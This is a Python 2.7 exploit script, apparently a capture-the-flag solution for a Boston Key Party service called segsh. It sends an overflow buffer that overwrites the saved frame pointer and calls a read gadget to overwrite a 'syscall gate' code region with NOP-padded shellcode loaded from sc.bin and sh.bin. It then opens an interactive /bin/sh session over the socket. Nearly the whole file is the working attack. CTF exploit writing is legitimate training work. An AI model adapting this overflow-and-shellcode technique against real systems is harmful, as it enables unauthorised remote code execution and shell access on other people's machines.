#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib

ADDR = "segsh.bostonkey.party"
PORT = 8888
DEBUG = True

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil_str(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DEBUG:
        sys.stdout.write(buf)
    return buf


def comm(rx, tx):
    r = rtil_str(rx)
    s.send(tx)
    return r

# rop gadgets
do_read = 0x6F

rtil_str(" __")
s.send("install -i echo\n")
rtil_str(" __")
s.send("exec -e echo\n")
rtil_str(": ")

ebp = 0x10000 - 0x100 - 0x300
buffy = "A" * 1016
buffy += p32(ebp)

# sc overwrite "syscall gate"
# stored at [gs:0x10] as a way to hijack eip
# then it jumps to shsc
# shsc is just /bin/sh shellcode that is
# appended after sc
sc = open("sc.bin", "r").read()
shsc = open("sh.bin", "r").read()
sc = "\x90" * 0x90 + sc + "\x90" * 0x200 + shsc

# we call read with an address such that when old_data is added to it
# it overlaps and points to old_code and we use that to overwrite the code
buffy += p32(do_read) + p32(0) + p32(-0x2000 & 0xffffffff) + p32(len(sc))

s.send(buffy + "\n")
rtil_str("\n")

s.send(sc)

t = telnetlib.Telnet()
t.sock = s
t.interact()
